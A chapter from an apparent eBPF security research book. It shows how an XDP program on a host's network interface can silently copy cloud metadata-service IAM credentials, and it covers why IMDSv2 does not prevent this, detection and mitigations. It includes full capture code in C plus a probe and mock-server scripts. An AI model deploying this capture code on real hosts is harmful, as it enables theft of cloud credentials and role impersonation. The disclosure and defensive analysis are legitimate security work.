---
layout: book
title: "Chapter 25: The Metadata Faucet"
date: 2026-04-17
---

# Chapter 25: The Metadata Faucet

> **See also**: [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch25-imds-harvest) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

> **Navigation**: [Chapter 24; The Token Hand-off]({{ site.baseurl }}/book/act-4/chapter-24-the-token-hand-off.html)

> **Proof status**: PROVEN on Ubuntu 6.17.0-29-generic aarch64 (Lima VM, Apple Silicon). XDP program on loopback (`lo`) intercepts mock IMDS traffic and captures credentials. Output: `[ch25] CREDENTIALS_CAPTURED access_key=ASIAEXAMPLEMOCK0001 token_len=1 role=demo-role` and `CH25_PROVEN access_key_captured=yes token_captured=yes`. Note: `--net=host` is required in Docker contexts for XDP to attach to the host interface. The Lima VM's loopback works directly.

Everything in this book until now targets in-host boundaries. This chapter is the first one that reaches off-host. The capability that gets stolen is a cloud IAM credential. The destination the attacker uses it against is the cloud provider's API. The primitive bridging the two is an XDP program on the network interface; the same tool the book demonstrated in the ch05b Ghost NIC POC and Chapter 15.

The argument is narrower than Chapter 23's. Chapter 23 rearranged the threat model; the TPM, which operators had filed under "we're good here," turned out to be in reach of an observability agent. This chapter does something simpler: it notes that a host which makes outbound HTTP calls to a metadata service is handing the attacker a credential every few hours, and the attacker does not need to compromise the metadata service to capture those credentials. They need to read the wire. XDP reads the wire cheaply and reliably.

## What the primitive produces

The BPF program attaches to the host's network interface with `SEC("xdp")`, parses the Ethernet/IP/TCP/HTTP layers, filters on destination IP `169.254.169.254` (the AWS IMDS endpoint; `metadata.google.internal` and Azure IMDS share the same address), and copies the HTTP payload into a ringbuf. The loader parses the stream in userspace and extracts the AWS Signature Version 4 credential triple (`AccessKeyId`, `SecretAccessKey`, `Token`) from the `iam/security-credentials/<role>` response.

The program returns `XDP_PASS` for every packet. Nothing is dropped, nothing is modified. The metadata service sees a normal request from the SDK; the SDK sees a normal response. The only difference is that a ringbuf map now holds copies of the credential bytes.

Proof marker:

```
=== CH25_PROVEN access_key_captured=yes token_captured=yes role=<role-name> ===
```

Together with the captured `AccessKeyId` and `SessionToken`, `role=<role-name>` is everything a remote attacker needs to sign an AWS API call as that role. The credentials expire in roughly six hours. The SDK refreshes them on schedule. The XDP program captures every refresh.

## Why IMDSv2 does not help as much as operators think

AWS introduced IMDSv2 in November 2019 as the mitigation for SSRF attacks. The two-step flow; PUT to get a token, GET with that token to get credentials; breaks most SSRF vectors because the vulnerable web app rarely permits attacker-controlled PUT requests.

The secondary hardening is `HttpPutResponseHopLimit`. The token response ships with TTL=1, meaning it cannot traverse more than one hop. Containers at hop 1 from IMDS see it legitimately. A remote attacker trying to proxy credentials out sees the TTL expire.

Both mitigations address the routed path from a container or a remote SSRF. Neither addresses the host network namespace itself. A BPF program attached to the host's eth0 is on the wire. It sees the PUT, the token response, the GET, the credentials. Hop limit is irrelevant to a process that reads packets before they traverse any hops. IMDSv2's token requirement is also irrelevant; the XDP program observes the SDK's own compliant exchange and captures both halves.

The mitigation assumed a threat model of "compromised container, correctly-configured host." This book addresses "correctly-configured container, compromised host via observability agent with `CAP_BPF`." IMDSv2 does not move against that attacker. The gap is what this chapter reaches into.

## The call path AWS SDKs take

A typical AWS SDK call that needs IAM credentials:

1. Checks its in-process credential cache. If live and not expiring in under five minutes, uses it directly.
2. The IMDS provider issues a PUT to `http://169.254.169.254/latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`. Response is the session token.
3. Issues a GET to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to discover the role name.
4. Issues a GET to `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` with the token. Response body is:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-04-17T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "IQoJb3J...",
  "Expiration": "2026-04-17T18:00:00Z"
}
```

The BPF program captures the raw HTTP of steps 2 and 4. The triple captured in step 4 is a complete credential for external use.

For GCP, the path is similar against `metadata.google.internal` (also `169.254.169.254`). The credential response is at `/computeMetadata/v1/instance/service-accounts/default/token`. For Azure, the endpoint is `169.254.169.254` and the path is `/metadata/identity/oauth2/token`. The BPF program's filter can match all three by destination IP; the userspace parser discriminates on HTTP path.

## The BPF program

```c
SEC("xdp")
int xdp_imds_capture(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (eth->h_proto != bpf_htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end) return XDP_PASS;
    if (ip->protocol != IPPROTO_TCP) return XDP_PASS;

    __u32 zero = 0;
    __u32 *m = bpf_map_lookup_elem(&cfg, &zero);
    __u32 mock_mode = m ? *m : 0;
    __u32 target_ip = mock_mode ? MOCK_IP_BE : IMDS_IP_BE;

    __u8 direction = 2;
    if (ip->daddr == target_ip)      direction = 0;
    else if (ip->saddr == target_ip) direction = 1;
    else                              return XDP_PASS;

    __u8 ihl = ip->ihl & 0x0f;
    if (ihl < 5) return XDP_PASS;

    struct tcphdr *tcp = (void *)ip + (ihl * 4);
    if ((void *)(tcp + 1) > data_end) return XDP_PASS;

    __u8 doff = tcp->doff & 0x0f;
    if (doff < 5) return XDP_PASS;

    __u8 *payload = (__u8 *)tcp + (doff * 4);
    if ((void *)payload >= data_end) return XDP_PASS;

    __u32 payload_len = (__u32)((__u8 *)data_end - payload);
    if (payload_len == 0) return XDP_PASS;
    if (payload_len > MAX_PAYLOAD) payload_len = MAX_PAYLOAD;

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return XDP_PASS;

    e->saddr       = ip->saddr;
    e->daddr       = ip->daddr;
    e->sport       = bpf_ntohs(tcp->source);
    e->dport       = bpf_ntohs(tcp->dest);
    e->payload_len = payload_len;
    e->direction   = direction;

    __u32 to_copy = payload_len;
    if (to_copy > 0 && to_copy <= MAX_PAYLOAD)
        bpf_probe_read_kernel(&e->payload, to_copy, payload);

    bpf_ringbuf_submit(e, 0);
    return XDP_PASS;
}
```

Standard XDP parse-ethernet-ip-tcp chain with the packet-bound checks the verifier requires. The filter matches source or destination IP against the real IMDS endpoint (`169.254.169.254`) or the mock localhost IP (`127.0.0.1`), configurable via the `cfg` map at runtime. The direction field lets the userspace parser distinguish the client's PUT/GET from the server's response.

`XDP_PASS` is load-bearing. The legitimate SDK must still see the response. The BPF program is a tee, not a gate.

The payload copy is bounded at 512 bytes. IMDSv2 responses are small; the token response is ~50 bytes, the role-discovery response is ~20 bytes, the credential JSON is ~500 bytes. A 512-byte bound captures the full credential document in a single event.

## The trigger

The trigger script prefers a real IMDS endpoint if reachable:

```bash
if timeout 1 curl -s -o /dev/null -w "%{http_code}" --request PUT \
        "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null | grep -q '^2'; then
    REAL_REACHABLE=1
fi
```

On environments without a real IMDS (including the test harness), it spins a Python mock server on `127.0.0.1:80`:

```python
class H(http.server.BaseHTTPRequestHandler):
    def do_PUT(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b"MOCKTOKEN_abcdef0123456789")
    def do_GET(self):
        self.send_response(200)
        if self.path == "/latest/meta-data/iam/security-credentials/":
            self.end_headers(); self.wfile.write(b"demo-role")
        elif self.path.startswith("/latest/meta-data/iam/security-credentials/"):
            self.end_headers()
            body = json.dumps({
                "Code":"Success","Type":"AWS-HMAC",
                "AccessKeyId":"ASIAEXAMPLEMOCK0001","SecretAccessKey":"MOCK_SECRET",
                "Token":"MOCK_SESSION_TOKEN_" + "a"*128,
                "Expiration":"2026-04-17T18:00:00Z"
            }).encode()
            self.wfile.write(body)
```

Both modes exercise the same BPF program and the same userspace parser. The only difference is whether the credentials the parser extracts are real AWS STS tokens or mock placeholders.

## Detection

XDP programs attached to a network interface are visible in three places.

**`ip -d link show <ifname>`** annotates the interface with `xdp`, `xdpgeneric`, or `xdpoffload`. An interface that suddenly grows an `xdpgeneric` line without a corresponding load event is a finding.

**`bpftool net show dev <ifname>`** lists the XDP program name, id, and load mode. Baseline diff against expected XDP programs; alert on new ones.

**`bpftool prog list type xdp -j`** enumerates all XDP programs across the host. On a box where only observability agents legitimately load XDP, any program not on the allowlist is a finding.

The IMDS-specific detection surface is the IAM side. AWS GuardDuty's `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` detector flags STS credentials used from an IP outside the instance's VPC. GCP Audit Logs and Azure Defender do the same for their respective platforms. All three must be explicitly enabled.

## Mitigation

**`aws:SourceVpc` / `aws:SourceIp` IAM conditions on the instance role.** Credentials can only be used from the VPC or IP range they were minted in. An attacker capturing the triple and replaying from outside the VPC fails. Caveat: intra-VPC hops bypass this.

**VPC endpoints with endpoint policies.** Force KMS, S3, STS through VPC endpoints and attach endpoint policies that restrict `aws:SourceVpce`. Cross-VPC replay fails.

**Short-lived assumed roles instead of instance roles.** An EC2 role is permanent as long as the instance runs. An assumed role via `sts:AssumeRole` is short-lived and, if assumption requires MFA or session tagging, harder to replay. Common in Kubernetes with IRSA / Pod Identity; rare in pure IAM-on-EC2.

**Do not colocate `CAP_BPF` with IMDS-dependent workloads.** The same advice the rest of the book gives. An observability agent with `CAP_BPF` on a host whose IAM role has `kms:Decrypt *` is a host whose KMS decrypts are the attacker's to issue.

**Deny outbound metadata-service traffic from pods, re-route to a sidecar.** Some service-mesh and CNI setups block `169.254.169.254` from pod namespaces and serve scoped IAM credentials via sidecar instead. The attack still works against the sidecar's own IMDS traffic on the host netns, but the sidecar's credentials can be narrower than the instance's.

None of these close the XDP capture. They constrain what the captured credential can be used for. The capture itself is structural: a box whose processes call IMDS is a box whose IMDS traffic lives on the wire, and `CAP_BPF` reads the wire.

## Honest scope

The metadata service is not compromised. IMDSv2 correctly enforces its token-challenge protocol. The SDK correctly presents the token. The credential triple is the intended response to a compliant request.

SSRF protections are not bypassed. IMDSv2's hop-limit and PUT-then-GET defenses work as designed against their intended threat. They do not address the host netns where `CAP_BPF` lives because they were never claimed to.

The attack requires `CAP_BPF` on the host, not inside a container. A compromised container with its own network namespace and no BPF grant cannot reach this primitive.

The captured credentials are ephemeral. The SDK refreshes automatically, and the XDP program captures each refresh. A single captured triple gives the attacker ~6 hours of access; a continuously running program gives the attacker ongoing access.

The scope of the compromise is the role's IAM policy. Chapter 22's inventory step should be paired with an IAM-policy audit on every `CAP_BPF`-adjacent workload. That is the only defense that works when this primitive lands.

---

**What this chapter adds to the book**: The ch05b Ghost NIC POC and Chapter 15 showed XDP can drop packets and redirect them cross-namespace. This chapter shows XDP can also read packets; the tap case rather than the drop or redirect case. Same primitive class, aimed at a different purpose: not packet manipulation but content exfiltration across a boundary operators thought was on a separate plane. Act 4's three chapters together: a persistent key-theft primitive against the hardest host key store (Chapter 23), a threat-model subversion that changes who needs `CAP_BPF` to run any of this (Chapter 24), and a cross-boundary cloud credential capture (this chapter). The defender's response is to scope the grant; the same answer the book has given since Chapter 22; but now with a clearer picture of what is at stake when the grant is not scoped.
